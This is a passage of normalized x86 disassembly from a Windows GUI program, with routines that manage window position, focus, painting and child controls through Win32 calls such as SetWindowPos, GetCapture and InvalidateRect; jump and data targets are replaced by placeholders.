test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403540
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_447cc0
test al al
jne r-xdata
sub_447d28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447cc0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447d48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447cc0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447d88
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45a2f0
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403540
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_447d88
test al al
jne r-xdata
sub_447dec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447d88
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447e0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445a78
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_443750
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_447e0c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_447ebc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_447e0c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_45a2f0
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_443750
test eax eax
jne r-xdata
sub_447f64
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447f84
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_446a04
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447fb8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447fd8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_448028
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44804c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_44181c
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_445ab4
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_445a78
mov dl [ esp ]
mov si 0xffd1
call sub_403540
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4480a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403540
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4480c8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403540
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_448100
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444224
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_445b14
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_446324
sub_448138
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403540
pop esi
pop ebx
retn
mov eax ebx
call sub_442bac
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404554
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404554
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_4481b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446704
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4442f8
sub_448218
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_446478
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_445874
pop ebx
retn
sub_448248
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_448270
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_445874
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4482e0
push ebx
mov ebx eax
mov eax ebx
call sub_444164
mov eax ebx
call sub_449088
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_445b14
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41d1e8
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_443750
sub_44831c
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_440dfc
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_448d84
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_443750
sub_44835c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_449088
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_448d84
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44839c
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_445b14
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_448c8c
sub_4483dc
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_448ec4
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_448ec4
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44843c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4431ac
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_442094
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_446670
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_4484ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44429c
mov edx esi
mov eax ebx
call sub_445ad4
pop esi
pop ebx
retn
sub_4484c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43f438
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_45a2f0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403540
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403540
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403540
test al al
jne r-xdata
sub_44855c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_449ef0
mov edx esi
mov eax ebx
call sub_4484c8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_443750
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_443750
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_443750
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45a2f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_443750
test eax eax
jne r-xdata
jmp r-xdata
sub_448640
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_443750
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_448694
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_443750
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45a2f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_443750
test eax eax
jne r-xdata
sub_4486e0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4484c8
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_443750
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45a2f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_443750
test eax eax
jne r-xdata
sub_44873c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45a2f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_443750
mov [ esi + 0xc ] eax
sub_448770
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_449088
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_441ba4
mov eax ebx
mov si 0xffd0
call sub_403540
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_441ef0
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_448848
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_445ab4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_445a78
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403540
inc edi
dec ebx
jne r-xdata
sub_448890
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44561c
xor eax eax
push ebp
push sub_44892e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448848
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44216c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448935
mov eax [ ebp - 0x4 ]
call sub_445624
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_4062e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_4062e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44893c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_445644
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_445a78
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_448a2c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_414418
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41425c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_414438
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4143bc
call sub_448d84
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4143bc
call sub_448d84
sub_448b04
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_448a2c
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_448b64
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_448d84
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_448d84
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
test eax eax
jne r-xdata
sub_448bc8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449088
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_443750
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_436540
call sub_436620
test al al
je r-xdata
mov eax ebx
call sub_445ab4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_445a78
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_445a78
test [ eax + 0x52 ] 0x4
je r-xdata
sub_448c8c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_441ef0
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_448cc4
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_45a2f0
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_448d04
push ebx
mov ebx eax
mov eax ebx
call sub_45a2f0
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45e154
pop ebx
retn
mov eax ebx
call sub_45a318
mov eax ebx
call sub_448d84
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_448d3c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448d60
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_448d60
sub_448d98
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412f04
mov eax edi
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_445a78
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_448e2c
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_448d84
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_448e64
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_449088
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448d84
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403540
sub_448f20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_414418
pop esi
pop ebx
retn
sub_448f44
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_448f20
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_41425c
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_414438
sub_448fb8
push ebx
push esi
mov ebx edx
mov esi eax
